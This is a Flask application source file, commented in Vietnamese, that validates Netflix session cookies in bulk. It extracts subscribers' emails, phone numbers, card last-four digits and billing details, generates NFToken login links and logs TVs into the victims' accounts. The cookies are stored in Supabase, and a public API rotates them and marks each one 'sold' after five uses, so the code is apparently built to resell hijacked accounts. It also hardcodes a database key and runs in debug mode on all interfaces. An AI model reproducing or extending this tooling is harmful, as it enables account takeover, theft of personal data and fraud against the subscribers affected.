from flask import Flask, request, jsonify, render_template, Response, send_file
from flask_cors import CORS
import json
import queue
import os
import threading
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Import core logic from main.py
from main import (
    _parse_cookie_input,
    check_account_info,
    check_country,
    generate_nftoken,
    tv_login_with_code,
    fetch_extra_account_info,
    CURRENCY_MAP,
)

app = Flask(__name__)
CORS(app)
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max upload


# ══════════════════════════════════════════════════════════════════════
#  Core Processing Helper
# ══════════════════════════════════════════════════════════════════════

def process_cookie(cookie_input, generate_token=True):
    """Process a single cookie and return a comprehensive result dict.
    Mirrors the logic in main.py's process_one() but returns JSON-friendly data.
    """
    netflix_id, secure_id, extras = _parse_cookie_input(cookie_input)

    if not netflix_id:
        return {'status': 'ERROR', 'error': 'Could not parse NetflixId from input'}

    # Step 1: Account info
    info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)

    base_cookie_dict = {'NetflixId': netflix_id}
    if secure_id:
        base_cookie_dict['SecureNetflixId'] = secure_id
    base_cookie_dict.update(extras)

    if info['status'] != 'LIVE':
        return info

    # Step 2: Country
    country = check_country(netflix_id, secure_id)

    # Step 3: Build full cookie dict
    cookie_dict = dict(base_cookie_dict)
    cookie_dict.update(collected_cookies)

    # Step 3.5: Extra info from /browse when fields are incomplete
    current_profiles = (
        [p.strip() for p in (info.get("profiles") or "").split(",") if p.strip()]
        if info.get("profiles") not in ("-", "") else []
    )
    current_num_profiles = int(info.get("numProfiles", 0) or 0)
    need_extra = (
        info.get("email") == "-" or
        info.get("owner") == "-" or
        info.get("profiles") == "-" or
        info.get("authURL") == "-" or
        current_num_profiles == 0 or
        current_num_profiles <= 1 or
        len(current_profiles) <= 1
    )
    if need_extra:
        try:
            extra = fetch_extra_account_info(cookie_dict)
            for key in ("email", "owner", "profiles", "country",
                        "membershipStatus", "authURL", "numProfiles"):
                if info.get(key, "-") == "-" and extra.get(key):
                    info[key] = extra[key]
                elif key == "numProfiles" and info.get(key, 0) == 0 and extra.get(key):
                    info[key] = extra[key]

            if extra.get("profiles"):
                extra_profiles = [p.strip() for p in extra["profiles"].split(",") if p.strip()]
                cur_p = (
                    [p.strip() for p in info.get("profiles", "-").split(",") if p.strip()]
                    if info.get("profiles") not in ("-", "") else []
                )
                if info.get("profiles") in ("-", "") or len(extra_profiles) > len(cur_p):
                    info["profiles"] = extra["profiles"]

            if extra.get("numProfiles"):
                info["numProfiles"] = max(
                    int(info.get("numProfiles", 0) or 0),
                    int(extra["numProfiles"])
                )

            if info.get("numProfiles", 0) == 0 and extra.get("profiles"):
                info["numProfiles"] = len(
                    [p.strip() for p in extra["profiles"].split(",") if p.strip()]
                )
        except Exception:
            pass

    # Update country if available from extra info
    if country in ("Unknown", "-") and info.get("country") not in ("-", "Unknown"):
        country = info["country"]

    # Step 4: NFToken
    token = None
    token_error = None
    if generate_token:
        token, token_error = generate_nftoken(cookie_dict)

    currency = CURRENCY_MAP.get(country, '?')
    membership = info.get('membershipStatus', '-')
    status_display = 'Active' if membership in ('CURRENT_MEMBER', '-', '') else membership

    return {
        'status': 'LIVE',
        'statusDisplay': status_display,
        'plan': info.get('plan', '-'),
        'price': info.get('price', '-'),
        'billing': info.get('billing', '-'),
        'videoQuality': info.get('videoQuality', '-'),
        'maxStreams': info.get('maxStreams', '-'),
        'paymentType': info.get('paymentType', '-'),
        'last4': info.get('last4', '-'),
        'memberSince': info.get('memberSince', '-'),
        'country': country,
        'currency': currency,
        'owner': info.get('owner', '-'),
        'email': info.get('email', '-'),
        'phone': info.get('phone', '-'),
        'membershipStatus': membership,
        'profiles': info.get('profiles', '-'),
        'numProfiles': info.get('numProfiles', 0),
        'numKidsProfiles': info.get('numKidsProfiles', 0),
        'extraMembers': info.get('extraMembers', False),
        'nftoken': token,
        'nftoken_error': token_error,
        'login_link': f'https://netflix.com/?nftoken={token}' if token else None,
        'authURL': info.get('authURL', '-'),
    }


# ══════════════════════════════════════════════════════════════════════
#  Routes
# ══════════════════════════════════════════════════════════════════════

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/api/docs')
def api_docs():
    base_url = request.url_root.rstrip('/')
    return render_template('api_docs.html', base_url=base_url)


@app.route('/api/check-single', methods=['POST'])
def api_check_single():
    data = request.get_json()
    if not data or not data.get('cookie'):
        return jsonify({'status': 'ERROR', 'error': 'Cookie input is required'}), 400

    result = process_cookie(data['cookie'].strip())
    return jsonify(result)


@app.route('/api/check-bulk', methods=['POST'])
def api_check_bulk():
    files = request.files.getlist('files')
    if not files:
        return jsonify({'error': 'No files uploaded'}), 400

    # Each file = 1 cookie (entire file content)
    cookies = []
    for f in files:
        content = f.read().decode('utf-8', errors='replace').strip()
        if content:
            cookies.append(content)

    if not cookies:
        return jsonify({'error': 'All files are empty'}), 400

    total = len(cookies)
    result_queue = queue.Queue()

    def worker(index, line):
        try:
            result = process_cookie(line)
            result_queue.put({'index': index, 'result': result})
        except Exception as e:
            result_queue.put({
                'index': index,
                'result': {'status': 'ERROR', 'error': str(e)}
            })

    def generate():
        import time
        yield f"data: {json.dumps({'type': 'start', 'total': total})}\n\n"

        # Số luồng cấu hình qua env BULK_WORKERS (mặc định 3 cho Render free)
        max_workers = int(os.environ.get('BULK_WORKERS', '3'))
        workers = min(max_workers, total)

        with ThreadPoolExecutor(max_workers=workers) as executor:
            for i, line in enumerate(cookies):
                executor.submit(worker, i, line)
                # Delay nhẹ mỗi batch để tránh Netflix rate-limit IP server
                if i > 0 and i % workers == 0:
                    time.sleep(0.3)

            checked = 0
            live_count = 0
            dead_count = 0
            error_count = 0
            last_heartbeat = time.time()

            while checked < total:
                try:
                    item = result_queue.get(timeout=5)
                    checked += 1

                    status = item['result'].get('status', 'ERROR')
                    if status == 'LIVE':
                        live_count += 1
                    elif status == 'DEAD':
                        dead_count += 1
                    else:
                        error_count += 1

                    event_data = {
                        'type': 'result',
                        'checked': checked,
                        'total': total,
                        'live': live_count,
                        'dead': dead_count,
                        'error': error_count,
                        'index': item['index'],
                        'result': item['result'],
                    }
                    yield f"data: {json.dumps(event_data)}\n\n"
                    last_heartbeat = time.time()
                except queue.Empty:
                    # Gửi heartbeat mỗi 15s để Render proxy không ngắt kết nối
                    if time.time() - last_heartbeat > 15:
                        yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                        last_heartbeat = time.time()

        summary = {
            'type': 'complete',
            'total': total,
            'live': live_count,
            'dead': dead_count,
            'error': error_count,
        }
        yield f"data: {json.dumps(summary)}\n\n"

    return Response(
        generate(),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no',
            'Connection': 'keep-alive',
        }
    )


@app.route('/api/tv-login', methods=['POST'])
def api_tv_login():
    data = request.get_json()
    if not data:
        return jsonify({'status': 'ERROR', 'error': 'Request body is required'}), 400

    cookie_input = data.get('cookie', '').strip()
    tv_code = data.get('tv_code', '').strip()

    if not cookie_input or not tv_code:
        return jsonify({'status': 'ERROR', 'error': 'Cookie and TV code are required'}), 400

    netflix_id, secure_id, extras = _parse_cookie_input(cookie_input)
    if not netflix_id:
        return jsonify({'status': 'ERROR', 'error': 'Could not parse NetflixId'}), 400

    # Check account to get authURL
    info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)

    if info.get('status') != 'LIVE':
        return jsonify({
            'status': 'ERROR',
            'error': f'Cookie is {info.get("status", "invalid")}. {info.get("error", "")}'.strip()
        })

    cookie_dict = {'NetflixId': netflix_id}
    if secure_id:
        cookie_dict['SecureNetflixId'] = secure_id
    cookie_dict.update(extras)
    cookie_dict.update(collected_cookies)

    auth_url = info.get('authURL')

    # Retry to get authURL if missing
    if (not auth_url or auth_url == '-') and (
        'SecureNetflixId' in collected_cookies or 'nfvdid' in collected_cookies
    ):
        extra_c = {
            k: v for k, v in collected_cookies.items()
            if k in ('SecureNetflixId', 'nfvdid')
        }
        info2, collected_cookies2 = check_account_info(
            netflix_id, collected_cookies.get('SecureNetflixId'), extra_cookies=extra_c
        )
        if info2.get('authURL') and info2['authURL'] != '-':
            auth_url = info2['authURL']
            cookie_dict.update(collected_cookies2)

    if not auth_url or auth_url == '-':
        return jsonify({
            'status': 'ERROR',
            'error': 'authURL not found. Include SecureNetflixId and nfvdid in cookie.'
        })

    ok, msg = tv_login_with_code(auth_url, tv_code, cookie_dict)

    country = info.get('country', '-')
    if country == '-':
        country = check_country(netflix_id, secure_id)

    return jsonify({
        'status': 'SUCCESS' if ok else 'FAILED',
        'message': msg,
        'account': {
            'owner': info.get('owner', '-'),
            'plan': info.get('plan', '-'),
            'country': country,
            'email': info.get('email', '-'),
        }
    })


# ══════════════════════════════════════════════════════════════════════
#  Cookie Storage System (Supabase)
# ══════════════════════════════════════════════════════════════════════

import requests

SUPABASE_URL = os.environ.get('SUPABASE_URL', 'https://tcugrnqbptpbhmqldkyf.supabase.co')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY', 'sb_publishable_W85BICZbBeNOZyyZS9XBLQ_Njn4gY6K')

def _supabase_headers(extra_headers=None):
    headers = {
        'apikey': SUPABASE_KEY,
        'Authorization': f'Bearer {SUPABASE_KEY}',
        'Content-Type': 'application/json'
    }
    if extra_headers:
        headers.update(extra_headers)
    return headers


@app.route('/api/storage/save', methods=['POST'])
def api_storage_save():
    """Save a valid cookie to Supabase storage."""
    data = request.get_json()
    if not data:
        return jsonify({'error': 'Request body is required'}), 400

    entry = {
        'savedAt': datetime.utcnow().isoformat() + 'Z',
        'cookie': data.get('cookie', ''),
        'plan': data.get('plan', '-'),
        'country': data.get('country', '-'),
        'email': data.get('email', '-'),
        'owner': data.get('owner', '-'),
        'profiles': data.get('profiles', '-'),
        'numProfiles': data.get('numProfiles', 0),
        'billing': data.get('billing', '-'),
        'login_link': data.get('login_link', ''),
        'nftoken': data.get('nftoken', ''),
        'videoQuality': data.get('videoQuality', '-'),
        'maxStreams': data.get('maxStreams', '-'),
        'label': data.get('label', ''),
    }

    # Fetch existing cookies (only ids and cookies text) to check for duplicates
    url = f"{SUPABASE_URL}/rest/v1/cookies?select=id,cookie"
    r = requests.get(url, headers=_supabase_headers())
    existing_id = None
    
    if r.status_code == 200:
        existing_list = r.json()
        cookie_text = entry['cookie'].strip()
        for item in existing_list:
            if item.get('cookie', '').strip() == cookie_text:
                existing_id = item.get('id')
                break

    if existing_id:
        # Update existing
        update_url = f"{SUPABASE_URL}/rest/v1/cookies?id=eq.{existing_id}"
        resp = requests.patch(update_url, headers=_supabase_headers(), json=entry)
        if resp.status_code in (200, 204):
            return jsonify({'status': 'updated', 'id': existing_id})
        return jsonify({'status': 'error', 'details': resp.text}), 500
    else:
        # Insert new
        insert_url = f"{SUPABASE_URL}/rest/v1/cookies"
        resp = requests.post(insert_url, headers=_supabase_headers({'Prefer': 'return=representation'}), json=entry)
        if resp.status_code in (200, 201):
            inserted_data = resp.json()
            return jsonify({'status': 'saved', 'id': inserted_data[0]['id'] if inserted_data else None})
        return jsonify({'status': 'error', 'details': resp.text}), 500


@app.route('/api/storage/list', methods=['GET'])
def api_storage_list():
    """List all stored cookies from Supabase."""
    url = f"{SUPABASE_URL}/rest/v1/cookies?order=savedAt.desc"
    r = requests.get(url, headers=_supabase_headers())
    
    if r.status_code != 200:
        return jsonify([])

    storage = r.json()
    safe_list = []
    for item in storage:
        safe_item = dict(item)
        cookie_raw = safe_item.get('cookie', '')
        if len(cookie_raw) > 40:
            safe_item['cookie_preview'] = cookie_raw[:20] + '...' + cookie_raw[-15:]
        else:
            safe_item['cookie_preview'] = cookie_raw
        # Don't send full cookie text by default to summary view
        safe_item.pop('cookie', None) 
        safe_list.append(safe_item)

    return jsonify(safe_list)


@app.route('/api/storage/delete', methods=['DELETE'])
def api_storage_delete():
    """Delete a stored cookie by ID."""
    data = request.get_json()
    if not data or not data.get('id'):
        return jsonify({'error': 'ID is required'}), 400

    target_id = data['id']
    url = f"{SUPABASE_URL}/rest/v1/cookies?id=eq.{target_id}"
    r = requests.delete(url, headers=_supabase_headers())
    
    if r.status_code in (200, 204):
        return jsonify({'status': 'deleted'})
    return jsonify({'error': 'Failed to delete'}), 500


@app.route('/api/storage/clear', methods=['DELETE'])
def api_storage_clear():
    """Delete all stored cookies."""
    # To delete all rows, Supabase requires to match everything, e.g. ID not null
    url = f"{SUPABASE_URL}/rest/v1/cookies?id=not.is.null"
    r = requests.delete(url, headers=_supabase_headers())
    
    if r.status_code in (200, 204):
        return jsonify({'status': 'cleared'})
    return jsonify({'error': 'Failed to clear'}), 500


@app.route('/api/storage/get-cookie', methods=['POST'])
def api_storage_get_cookie():
    """Get the full cookie text for a stored entry by ID."""
    data = request.get_json()
    if not data or not data.get('id'):
        return jsonify({'error': 'ID is required'}), 400

    target_id = data['id']
    url = f"{SUPABASE_URL}/rest/v1/cookies?id=eq.{target_id}&select=cookie"
    r = requests.get(url, headers=_supabase_headers())
    
    if r.status_code == 200:
        results = r.json()
        if results:
            return jsonify({'cookie': results[0].get('cookie', '')})

    return jsonify({'error': 'Not found'}), 404


@app.route('/api/storage/export', methods=['GET'])
def api_storage_export():
    """Export all stored cookies as a ZIP file containing individual .txt files."""
    url = f"{SUPABASE_URL}/rest/v1/cookies?order=savedAt.desc"
    r = requests.get(url, headers=_supabase_headers())
    
    storage = r.json() if r.status_code == 200 else []

    import zipfile
    import io

    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for idx, item in enumerate(storage):
            email = item.get('email')
            if not email or email == '-':
                email = f"unknown_{idx}"
            else:
                email = email.replace('/', '-').replace('\\', '-').replace(':', '-')
                
            country = item.get('country') or 'XX'
            if country == '-': country = 'XX'
            
            plan = item.get('plan') or 'Unknown'
            if plan == '-': plan = 'Unknown'
            
            # Tên file giống định dạng file cookie: [Premium] [US] user@email.com.txt
            filename = f"[{plan}] [{country}] {email}.txt"
            
            cookie = item.get('cookie', '')
            zip_file.writestr(filename, cookie)

    zip_buffer.seek(0)
    
    return send_file(
        zip_buffer,
        mimetype='application/zip',
        as_attachment=True,
        download_name=f'netflix_cookies_{int(datetime.now().timestamp())}.zip'
    )


# ══════════════════════════════════════════════════════════════════════
#  Public API – Dùng cho website bên ngoài
# ══════════════════════════════════════════════════════════════════════

def _fetch_cookie_from_storage(cookie_id):
    """Fetch full cookie text from Supabase by ID. Returns (cookie_text, error_response)."""
    url = f"{SUPABASE_URL}/rest/v1/cookies?id=eq.{cookie_id}&select=cookie"
    r = requests.get(url, headers=_supabase_headers())
    if r.status_code != 200:
        return None, jsonify({'status': 'ERROR', 'error': 'Không thể kết nối kho lưu trữ'}), 500
    results = r.json()
    if not results:
        return None, jsonify({'status': 'ERROR', 'error': 'Không tìm thấy cookie trong kho'}), 404
    return results[0].get('cookie', ''), None


def _update_storage_entry(cookie_id, update_data):
    """Update a cookie entry in Supabase with new data (e.g., refreshed login_link)."""
    url = f"{SUPABASE_URL}/rest/v1/cookies?id=eq.{cookie_id}"
    requests.patch(url, headers=_supabase_headers(), json=update_data)


@app.route('/api/public/get-link', methods=['GET', 'POST'])
def api_public_get_link():
    """
    API tự động lấy link đăng nhập Netflix (Xoay vòng luân phiên).
    
    Cách hoạt động:
      1. Lấy 5 cookie CHƯA BÁN (sold=false), ưu tiên cái lâu chưa dùng nhất.
      2. Kiểm tra lần lượt, cái nào SỐNG → trả link + tăng usage_count.
      3. Khi usage_count đạt 5 → đánh dấu sold=true (đã bán hết slot).
      4. Cái nào CHẾT → xóa khỏi kho luôn.
      5. Sau mỗi lần trả link, đẩy cookie xuống cuối hàng chờ (xoay vòng).
    
    Response JSON (thành công):
        {
            "status": "SUCCESS",
            "login_link": "https://netflix.com/?nftoken=...",
            "nftoken": "...",
            "usage": "3/5",
            "account": { "email", "plan", "country", "owner" }
        }
    Response JSON (thất bại):
        { "status": "ERROR", "error": "..." }
    """
    MAX_USAGE = 5  # Tối đa 5 lần lấy link cho mỗi cookie

    # Lấy 5 cookie CHƯA BÁN, lâu chưa dùng nhất (xoay vòng)
    url = (
        f"{SUPABASE_URL}/rest/v1/cookies"
        f"?select=id,cookie,usage_count"
        f"&or=(sold.is.null,sold.eq.false)"
        f"&order=savedAt.asc"
        f"&limit=5"
    )
    r = requests.get(url, headers=_supabase_headers())
    
    if r.status_code != 200:
        return jsonify({'status': 'ERROR', 'error': 'Lỗi kết nối Database'}), 500
        
    cookies_list = r.json()
    if not cookies_list:
        return jsonify({
            'status': 'ERROR', 
            'error': 'Kho hết cookie khả dụng (tất cả đã bán hoặc trống)'
        }), 404

    for item in cookies_list:
        cookie_id = item.get('id')
        cookie_text = item.get('cookie')
        current_usage = item.get('usage_count') or 0
        
        if not cookie_text:
            continue
            
        result = process_cookie(cookie_text, generate_token=True)
        
        if result.get('status') == 'LIVE':
            login_link = result.get('login_link')
            if login_link:
                new_usage = current_usage + 1
                
                # Cập nhật: tăng usage_count + xoay vòng savedAt
                update_data = {
                    'login_link': login_link,
                    'nftoken': result.get('nftoken', ''),
                    'usage_count': new_usage,
                    'savedAt': datetime.now().isoformat(),
                }
                
                # Đủ 5 slot → đánh dấu ĐÃ BÁN
                if new_usage >= MAX_USAGE:
                    update_data['sold'] = True
                
                _update_storage_entry(cookie_id, update_data)
                
                return jsonify({
                    'status': 'SUCCESS',
                    'login_link': login_link,
                    'nftoken': result.get('nftoken'),
                    'usage': f'{new_usage}/{MAX_USAGE}',
                    'account': {
                        'email': result.get('email', '-'),
                        'plan': result.get('plan', '-'),
                        'country': result.get('country', '-'),
                        'owner': result.get('owner', '-'),
                    }
                })
                
        # Cookie chết → xóa luôn khỏi kho
        delete_url = f"{SUPABASE_URL}/rest/v1/cookies?id=eq.{cookie_id}"
        requests.delete(delete_url, headers=_supabase_headers())

    return jsonify({
        'status': 'ERROR', 
        'error': 'Thử 5 cookie liên tiếp đều hỏng/hết hạn và đã xóa. Gọi lại API để thử tiếp!'
    }), 404


@app.route('/api/public/check', methods=['POST'])
def api_public_check():
    """
    Kiểm tra cookie còn hợp lệ không, truy xuất từ kho lưu trữ.
    
    Request JSON:
        { "id": "<uuid của cookie trong kho>" }
    
    Response JSON (hợp lệ):
        {
            "status": "LIVE",
            "account": { "email", "plan", "country", "owner", ... }
        }
    
    Response JSON (hết hạn):
        { "status": "DEAD" }
    """
    data = request.get_json()
    if not data or not data.get('id'):
        return jsonify({'status': 'ERROR', 'error': 'Thiếu ID cookie'}), 400

    cookie_text, err = _fetch_cookie_from_storage(data['id'])
    if err:
        return err

    if not cookie_text:
        return jsonify({'status': 'ERROR', 'error': 'Cookie trống'}), 400

    # Kiểm tra nhanh (không tạo token để tăng tốc)
    result = process_cookie(cookie_text, generate_token=False)

    if result.get('status') == 'LIVE':
        return jsonify({
            'status': 'LIVE',
            'account': {
                'email': result.get('email', '-'),
                'plan': result.get('plan', '-'),
                'country': result.get('country', '-'),
                'owner': result.get('owner', '-'),
                'profiles': result.get('profiles', '-'),
                'numProfiles': result.get('numProfiles', 0),
                'billing': result.get('billing', '-'),
                'videoQuality': result.get('videoQuality', '-'),
                'maxStreams': result.get('maxStreams', '-'),
                'memberSince': result.get('memberSince', '-'),
            }
        })
    elif result.get('status') == 'DEAD':
        return jsonify({'status': 'DEAD'})
    else:
        return jsonify({
            'status': 'ERROR',
            'error': result.get('error', 'Lỗi không xác định')
        })


@app.route('/api/public/tv-login', methods=['POST'])
def api_public_tv_login():
    """
    Đăng nhập TV bằng mã code, sử dụng cookie đã lưu trong kho.
    
    Request JSON:
        {
            "id": "<uuid của cookie trong kho>",
            "tv_code": "ABCD1234"
        }
    
    Response JSON (thành công):
        {
            "status": "SUCCESS",
            "message": "Đăng nhập TV thành công!",
            "account": { "email", "plan", "country", "owner" }
        }
    
    Response JSON (thất bại):
        { "status": "ERROR", "error": "..." }
    """
    data = request.get_json()
    if not data or not data.get('id') or not data.get('tv_code'):
        return jsonify({'status': 'ERROR', 'error': 'Thiếu ID cookie hoặc mã TV'}), 400

    tv_code = data['tv_code'].strip()
    if not tv_code:
        return jsonify({'status': 'ERROR', 'error': 'Mã TV không hợp lệ'}), 400

    cookie_text, err = _fetch_cookie_from_storage(data['id'])
    if err:
        return err

    if not cookie_text:
        return jsonify({'status': 'ERROR', 'error': 'Cookie trống'}), 400

    # Parse cookie
    netflix_id, secure_id, extras = _parse_cookie_input(cookie_text)
    if not netflix_id:
        return jsonify({'status': 'ERROR', 'error': 'Không thể phân tích NetflixId'}), 400

    # Check account to get authURL
    info, collected_cookies = check_account_info(netflix_id, secure_id, extra_cookies=extras)

    if info.get('status') != 'LIVE':
        return jsonify({
            'status': 'ERROR',
            'error': f'Cookie {info.get("status", "không hợp lệ")}. {info.get("error", "")}'.strip()
        })

    cookie_dict = {'NetflixId': netflix_id}
    if secure_id:
        cookie_dict['SecureNetflixId'] = secure_id
    cookie_dict.update(extras)
    cookie_dict.update(collected_cookies)

    auth_url = info.get('authURL')

    # Retry to get authURL if missing
    if (not auth_url or auth_url == '-') and (
        'SecureNetflixId' in collected_cookies or 'nfvdid' in collected_cookies
    ):
        extra_c = {
            k: v for k, v in collected_cookies.items()
            if k in ('SecureNetflixId', 'nfvdid')
        }
        info2, collected_cookies2 = check_account_info(
            netflix_id, collected_cookies.get('SecureNetflixId'), extra_cookies=extra_c
        )
        if info2.get('authURL') and info2['authURL'] != '-':
            auth_url = info2['authURL']
            cookie_dict.update(collected_cookies2)

    if not auth_url or auth_url == '-':
        return jsonify({
            'status': 'ERROR',
            'error': 'Không tìm thấy authURL. Cookie cần có SecureNetflixId và nfvdid.'
        })

    ok, msg = tv_login_with_code(auth_url, tv_code, cookie_dict)

    country = info.get('country', '-')
    if country == '-':
        country = check_country(netflix_id, secure_id)

    return jsonify({
        'status': 'SUCCESS' if ok else 'FAILED',
        'message': msg,
        'account': {
            'owner': info.get('owner', '-'),
            'plan': info.get('plan', '-'),
            'country': country,
            'email': info.get('email', '-'),
        }
    })


@app.route('/api/public/list', methods=['GET'])
def api_public_list():
    """
    Liệt kê tất cả cookie trong kho (không bao gồm cookie text gốc).
    
    Response JSON:
        [
            {
                "id": "uuid",
                "email": "...",
                "plan": "...",
                "country": "...",
                "login_link": "...",
                "savedAt": "...",
                ...
            }
        ]
    """
    url = f"{SUPABASE_URL}/rest/v1/cookies?order=savedAt.desc"
    r = requests.get(url, headers=_supabase_headers())

    if r.status_code != 200:
        return jsonify([])

    storage = r.json()
    safe_list = []
    for item in storage:
        safe_item = dict(item)
        safe_item.pop('cookie', None)  # không trả cookie gốc ra ngoài
        safe_list.append(safe_item)

    return jsonify(safe_list)


# ══════════════════════════════════════════════════════════════════════
#  Entry Point
# ══════════════════════════════════════════════════════════════════════

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=True)
